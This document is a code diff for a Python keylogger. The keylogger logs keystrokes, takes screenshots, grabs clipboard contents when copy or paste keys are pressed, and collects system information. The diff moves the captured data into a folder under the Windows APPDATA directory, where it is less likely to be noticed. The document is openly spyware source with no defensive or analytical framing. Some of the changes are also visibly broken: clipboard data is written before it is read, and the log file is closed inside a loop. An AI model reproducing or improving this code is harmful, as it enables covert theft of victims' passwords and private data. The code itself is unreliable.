@@ -33,17 +33,21 @@ from PIL import ImageGrab
 
 keys_information = "key_log.txt"
 system_information= "systeminfo.txt"
-screenshot_information= "screenshots.png"
-system_information = "syseminfo.txt"
+screenshot_information= "screenshot.png"
 clipboard_information = "clipboard.txt"
 
 #file_path to be changed to C:\Users\Geek\AppData\Roaming
-file_path = os.getcwd()
-extend="\\"
+file_path = os.getenv('APPDATA')
+try:
+    os.mkdir(file_path + '\\keylogger')
+except:
+    pass
+
+extend="\\keylogger\\"
 
 def screenshot():
     im = ImageGrab.grab()
-    im.save(file_path+extend+screenshot_information )
+    im.save(file_path + extend + screenshot_information)
 screenshot()
 
 def computer_information():
@@ -66,11 +70,10 @@ computer_information()
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
+            f.write("\n Clipboard Data: \n" + data)
             win32clipboard.OpenClipboard()
             data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-
-            f.write("Clipboard Data: \n" + data)
 
         except:
             f.write("Clipboard could not be copied")
@@ -80,9 +83,13 @@ count = 0
 keys=[]
 def on_press(key):
     global keys,count
-    print(key) #remove this
+    print(key)
     keys.append(key)
     count += 1
+    if hasattr(key, 'char') and key.char == '\x03':
+        copy_clipboard()
+    elif hasattr(key, 'char') and key.char == '\x16':
+        copy_clipboard()
 
     if count >= 1:
         count = 0
@@ -91,48 +98,65 @@ def on_press(key):
 
 def write_file(keys):
     with open(file_path+extend+keys_information,"a") as f:
-        print("file opened in roaming succesffully")
         for key in keys:
             k=str(key).replace("'","")
-            if k.find("space")>0:
-                f.write('\n')
-                f.close()
+            if key==Key.space:
+                f.write(' [space] ')
             elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
-                f.write("[shift] \n")
+                f.write(" [shift] \n")
+                f.close()
             elif key == Key.ctrl_l or key == Key.ctrl_r:
-                f.write("[ctrl] \n")
+                f.write(" [ctrl] \n")
+                f.close()
             elif key == Key.alt_l or key == Key.alt_gr:
-                f.write("[alt] \n")
+                f.write(" [alt] \n")
+                f.close()
             elif key==Key.enter:
-                f.write("[enter] \n")
+                f.write(" [enter] \n")
+                f.close()
             elif key == Key.backspace:
-                f.write("[backspace] \n")
+                f.write(" [backspace] \n")
+                f.close()
             elif key==Key.caps_lock:
-                f.write("[caps_lock] \n")
+                f.write(" [caps_lock] \n")
+                f.close()
             elif key==Key.tab:
-                f.write("[tab] \n")
+                f.write(" [tab] \n")
+                f.close()
             elif key==Key.end:
-                f.write("[end] \n")
+                f.write(" [end] \n")
+                f.close()
             elif key==Key.home:
-                f.write("[home] \n")
+                f.write(" [home] \n")
+                f.close()
             elif key==Key.page_down:
-                f.write("[page_down] \n")
+                f.write(" [page_down] \n")
+                f.close()
             elif key==Key.page_up:
-                f.write("[page_up] \n")
+                f.write(" [page_up] \n")
+                f.close()
             elif key==Key.pause:
-                f.write("[pause] \n")
+                f.write(" [pause] \n")
+                f.close()
             elif key==Key.insert:
-                f.write("[insert] \n")
+                f.write(" [insert] \n")
+                f.close()
             elif key==Key.up:
-                f.write("[up] \n")
+                f.write(" [up] \n")
+                f.close()
             elif key==Key.down:
-                f.write("[down] \n")
+                f.write(" [down] \n")
+                f.close()
             elif key==Key.right:
-                f.write("[right] \n")
+                f.write(" [right] \n")
+                f.close()
             elif key==Key.left:
-                f.write("[left] \n")
+                f.write(" [left] \n")
+                f.close()
             elif key==Key.delete:
-                f.write("[delete] \n")
+                f.write(" [delete] \n")
+                f.close()
+
             elif k.find("Key") == -1:
                 f.write(k)
                 f.close()
